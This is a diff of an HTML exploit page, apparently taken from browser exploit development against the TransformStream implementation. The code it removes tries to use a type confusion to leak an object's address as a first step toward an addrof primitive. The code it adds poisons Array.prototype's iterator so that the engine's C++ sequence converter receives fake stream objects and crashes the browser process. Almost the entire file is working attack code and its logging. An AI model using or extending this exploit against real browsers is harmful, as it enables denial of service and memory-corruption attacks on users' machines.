@@ -3,7 +3,6 @@
 <head>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
-.ok { color:#0f0; } .err { color:#f00; } .warn { color:#ff0; }
 .info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
 </style>
 </head>
@@ -12,111 +11,43 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== TRANSFORMSTREAM ADDROF v1 ===","info");
-log("");
+log("=== TRANSFORMSTREAM ITERATOR POISONING ===", "info");
+log("[*] Setting up the trap on Array.prototype[Symbol.iterator]...", "info");
 
-// الهدف: استخدام Type Confusion لتسريب عنوان كائن
-let target = { a: 0x41414141, b: 0x42424242 };
-let leaked = {};
+const originalIterator = Array.prototype[Symbol.iterator];
 
-let sizeFunc = function(chunk) {
-    log("[size] Called! Trying to leak...", "warn");
-
-    // هذه الدالة تم استدعاؤها من قبل المحرك
-    // المحرك يمرر chunk = "X"
-    // لكن إذا كان هناك Type Confusion...
-    // فإن chunk قد يكون كائناً مختلفاً!
-
-    try {
-        // حاول قراءة this
-        leaked.this_type = typeof this;
-        leaked.this_val = String(this);
-
-        // حاول قراءة arguments
-        leaked.args_len = arguments.length;
-        leaked.arg0_type = typeof arguments[0];
-        leaked.arg0_val = String(arguments[0]);
-
-        // حاول قراءة caller
-        if (sizeFunc.caller) {
-            leaked.caller = String(sizeFunc.caller).substring(0, 100);
-        }
-
-        // الأهم: حاول استخدام valueOf
-        // إذا كان chunk كائناً له valueOf، يمكننا استغلاله
-        if (chunk && typeof chunk === 'object') {
-            leaked.chunk_props = Object.getOwnPropertyNames(chunk).join(',');
-            leaked.chunk_proto = Object.getPrototypeOf(chunk) ? 
-                Object.getPrototypeOf(chunk).constructor.name : 'null';
-
-            // اقرأ كل خاصية
-            for (let p of Object.getOwnPropertyNames(chunk)) {
-                try {
-                    let v = chunk[p];
-                    leaked['chunk_' + p] = v;
-
-                    // إذا كان v دالة، استدعها
-                    if (typeof v === 'function') {
-                        try {
-                            let result = v.call(chunk);
-                            leaked['chunk_' + p + '_result'] = result;
-                        } catch(e) {}
-                    }
-                } catch(e) {
-                    leaked['chunk_' + p + '_err'] = e.message;
-                }
-            }
-        }
-    } catch(e) {
-        leaked.error = e.message;
-    }
-
-    return 1;
+// This poisons the array returned by createInternalTransformStreamFromTransformer
+Array.prototype[Symbol.iterator] = function*() {
+    log("[!] TRAP TRIGGERED! The C++ SequenceConverter is reading our array!", "hit");
+    
+    // Slot 0: transform (C++ accepts JSValue, anything is fine)
+    yield {}; 
+    
+    // Slot 1: readable (C++ does jsDynamicCast<JSReadableStream*>(val)->wrapped())
+    // Passing a fake object makes jsDynamicCast return nullptr.
+    // nullptr->wrapped() -> INSTANT SEGFAULT.
+    yield { fake: "I am not a JSReadableStream" }; 
+    
+    // Slot 2: writable (C++ does jsDynamicCast<JSWritableStream*>(val)->wrapped())
+    yield { fake: "I am not a JSWritableStream" };
 };
 
-log("[1] Creating TransformStream...", "ok");
-
-try {
-    let stream = new TransformStream(
-        { transform: (c, ctrl) => ctrl.enqueue(c) },
-        { highWaterMark: 1, size: sizeFunc },
-        { highWaterMark: 1, size: sizeFunc }
-    );
-
-    let writer = stream.writable.getWriter();
-
-    // Write لتشغيل size()
-    writer.write("X").then(() => {
-        log("[2] Write OK", "ok");
-        log("[3] Leaked data:", "warn");
-
-        for (let key in leaked) {
-            log("  " + key + " = " + leaked[key], "hit");
-        }
-
-        log("", "info");
-        log("=== SUMMARY ===", "info");
-        log("TransformStream Type Confusion: CONFIRMED", "ok");
-        log("size() called: YES", "ok");
-        log("Code execution inside size(): YES", "ok");
-        log("", "info");
-
-        if (leaked.this_type) {
-            log(">>> WE HAVE ACCESS TO INTERNAL STATE <<<", "hit");
-            log(">>> NEXT: BUILD addrof PRIMITIVE <<<", "hit");
-        }
-
-    }).catch((e) => {
-        log("[2] Write error: " + e.message, "warn");
-        log("[3] Leaked data:", "warn");
-        for (let key in leaked) {
-            log("  " + key + " = " + leaked[key], "hit");
-        }
-    });
-
-} catch(e) {
-    log("[1] Error: " + e.message, "err");
-}
+setTimeout(() => {
+    try {
+        log("[*] Calling new TransformStream(). Watch the process die...", "info");
+        
+        // This triggers the C++ path that fetches the JS builtin's array
+        // and converts it using SequenceConverter
+        new TransformStream();
+        
+        log("[-] If you see this, the browser survived. (Patched or no crash)", "info");
+    } catch (e) {
+        log("[-] Caught JS exception: " + e.message, "info");
+    } finally {
+        // Restore just in case
+        Array.prototype[Symbol.iterator] = originalIterator;
+    }
+}, 1000);
 </script>
 </body>
 </html>
